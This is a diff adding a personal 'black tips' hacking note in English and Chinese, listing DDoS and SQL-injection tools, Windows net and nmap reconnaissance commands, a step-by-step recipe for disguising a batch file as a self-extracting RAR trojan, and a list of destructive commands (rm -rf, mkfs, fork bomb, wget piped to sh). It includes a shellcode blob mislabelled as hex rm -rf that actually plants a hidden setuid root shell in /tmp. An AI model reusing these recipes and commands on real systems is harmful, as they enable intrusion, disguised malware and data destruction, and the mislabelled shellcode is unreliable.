@@ -1,0 +1,122 @@
+================================JamesKid============================== 
+ @author		: JamesKid  
+ @description  : this is note about black tips
+ @change		:
+======================================================================
+# tool(web渗透测试工具)
+	ParolaPass Password Generator、Find Host IP、Anonymous
+	HOIC、Ddosim、Pyloris、Slowloris、TorsHammer、Sqlmap、Havij、Sql Poison、Admin
+	Finder、John the Ripper、Hash Identifier、Tor、XChat
+	IRC、Pidgin、Vidalia、Polipo、JonDo、i2p、Wireshark、Zenmap
+# command
+	# net
+		# windows
+			nbtstat -A ip		# show the ip's information in windows
+			net view \\ip		# show what share in ip 
+			net use x: \\ip\sharename	# put the share to x: disk
+			net start telnet	# start the service in remote server
+			net stop telnet		# stop the service in remote server
+			net user			# show the net user
+			net user abcd 1234 /add		# add a user named abcd password 1234 in 
+										# default group user
+			net user abcd /del	# delelte the user abcd
+			net user abcd /active:no	# forbid the user abcd
+			net user abcd		# check the user abcd
+			net localgroup		# show the local group
+			net localgroup groupname username /add	# add a user go group
+			net time \\ip		# show the time in remote server
+			net share d$ /delte	# delte the d disk share
+			net use \\ip\ipc$""/user:""  # add an empty link
+			net use \\ip\ipc$"password"user:"username"  # add user link
+			net use \\ip\ipc$/del	# del a share
+			net use k: /del		# del the share k disk
+		# linux
+			nmblookup -A ip		# shoe the ip's information in linux
+	# netstat	
+		# windows
+			netstat -a				# show all the port information
+			netstat -r				# show all route information
+			netstat -ano | findstr 4950 # show all the port information in pid
+										# 4950
+		# linux
+			net -atn			# show all the port information
+			net -r				# show all route information
+	# telnet	
+		# windows
+			telnet				# go to the telnet console	
+	# tasklist
+		# windows
+			tasklist			# show the task pid and memory use
+	# taskkill 
+		# windows
+			taskkill /pid 2400	# kill the 2400 process
+# inspect 
+	# basic 
+		# 检查指定ip的上的指定端口是否开放
+			telnet 192.168.1.100 3306
+		# 查看网站用的是什么web服务器
+			http://uptime.netcraft.com/up/graph?site=www.web.com
+	# command 
+		#  nmap  
+			nmap -sL 192.168.1.0/24   # 列出指定网段的主机,不发送报文,查看对应的ip有哪些网站
+			nmap -sO 192.168.1.100    # 确定目标机支持哪些ip协议
+			nmap -O 192.168.1.100	  # 探测目标主机的操作系统
+			nmap -v www.frltest.com     # 探测主机开放的端口 * * * 
+			nmap 192.168.0.*		  # 扫描整个子网
+			nmap -sP 192.168.1.0/24　 # 进行ping扫描，打印出对扫描做出响应的主机：　
+			nmap -PS 192.168.1.234　  # 探测目标主机开放的端口，可以指定一个以逗号分隔的端口列表(如-PS
+			22，23，25，80)：　
+			nmap -sS 192.168.1.0/24   # 显示列表所有在线主机信息，包含端口，物理地址等
+
+
+# hourse
+	# rar hourse
+		1. create a bat file 'cc.bat'
+		2. create a flash .swf 'aa.swf'
+		3. select these two file,and right click 添加到压宿文件 
+		4. 勾选'创建自解压格式压缩文件'
+		5. 高级->自解压选项->解压路径(输入想解压到的地方)->解压后运行(cc.bat)
+		6. 模式->全部隐藏
+		7. 文件和图标(修改文件和图标)
+		8. 注释->添加一行 Setup=explorer.exe aa.swf
+		
+# path
+	# qq	
+		# chatting records
+			C:\Users\Administrator\Documents\Tencent Files\qq_number\Msg2.0.db
+# attack 
+	# 致命的根权限命令
+		# 1. rm -f      # 将删除目录下的所有文件
+		# 2. 这是 rm -rf / 的 hex（十六进制）版本，很能迷惑 Linux 用户。
+			char esp[] __attribute__ ((section(".text"))) /* e.s.p
+			release */
+			= "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
+			"\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
+			"\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
+			"\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
+			"\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
+			"\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
+			"\x6e\x2f\x73\x68\x00\x2d\x63\x00"
+			"cp -p /bin/sh /tmp/.beyond; chmod 4755
+			/tmp/.beyond;";
+		# 3. mkfs.ext3 dev/sda   # 这将对硬盘进行重新格式化
+		# 4. :(){ :|:& };:       # 著名的 fork 炸弹，此命令将告诉你的
+								 # 系统执行海量的进程，直到你的系统僵死。
+		# 5.  any_command > /dev/sda  # 使用该命令,原始数据将被写到块设备,
+									  # 其结果是造成数据丢失
+		# 6. wget http://some_untrsted_source -0- | sh #  不要从不信任的地方下载
+													  # 东西,这可能会获取恶意代码.
+		# 7. mv /home/yourhomedirectory/* /dev/null  # 将移动主目录到一个不存在的地方
+		# 8. cat /dev/null > /dev/sda
+
+		# 9. chown -R someone /
+
+		# 10 chmod 7777 -R /   
+
+		# cp xxx.txt /dev/sda5       # 如果没挂载则D盘的分区会没了
+			
+# port 
+	number	protocol   description
+	139		SMB		   # local area network
+	135		NETBIOS	   # netbios 
+	445	    CIFS	   # local area network
